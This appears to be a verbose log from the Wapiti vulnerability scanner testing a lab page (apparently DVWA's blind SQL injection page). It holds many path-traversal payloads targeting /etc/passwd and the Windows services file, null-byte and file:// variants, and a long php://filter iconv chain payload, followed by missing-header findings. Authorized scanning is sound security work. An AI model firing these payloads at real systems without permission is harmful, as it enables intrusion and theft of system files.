2024-03-20 12:44:17.648 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 12:44:17.658 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 12:44:17.671 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.681 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.690 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (1)
2024-03-20 12:44:17.700 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
2024-03-20 12:44:17.710 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
2024-03-20 12:44:17.722 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
2024-03-20 12:44:17.731 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
2024-03-20 12:44:17.740 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
2024-03-20 12:44:17.750 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
2024-03-20 12:44:17.759 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.768 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.777 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 12:44:17.786 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 12:44:17.796 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.805 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.814 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
2024-03-20 12:44:17.822 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
2024-03-20 12:44:17.833 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
2024-03-20 12:44:17.843 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
2024-03-20 12:44:17.852 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
2024-03-20 12:44:17.861 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
2024-03-20 12:44:17.871 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.879 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.888 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 12:44:17.897 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 12:44:17.906 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.916 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.924 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=file%3A%2F%2F%2Fetc%2Fpasswd (1)
2024-03-20 12:44:17.933 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (1)
2024-03-20 12:44:17.944 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (1)
2024-03-20 12:44:17.953 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (1)
2024-03-20 12:44:17.962 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (1)
2024-03-20 12:44:17.973 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:17.983 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 12:44:17.993 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 12:44:18.008 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/ (1)
2024-03-20 12:44:18.033 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-20 12:44:18.045 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit (0)
2024-03-20 12:44:18.053 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-20 12:44:18.053 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-20 12:44:18.110 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-20 12:44:18.110 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-20 12:44:18.204 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-20 12:44:18.217 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit (0)
2024-03-20 12:44:18.240 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit (1)
2024-03-20 12:44:18.260 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/ (1)
2024-03-20 12:44:18.325 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-20 12:44:18.348 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//sqli_blind_low.json/
2024-03-20 12:44:18.348 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//sqli_blind_low.json/web_03202024_1244.html with a browser to see this report.
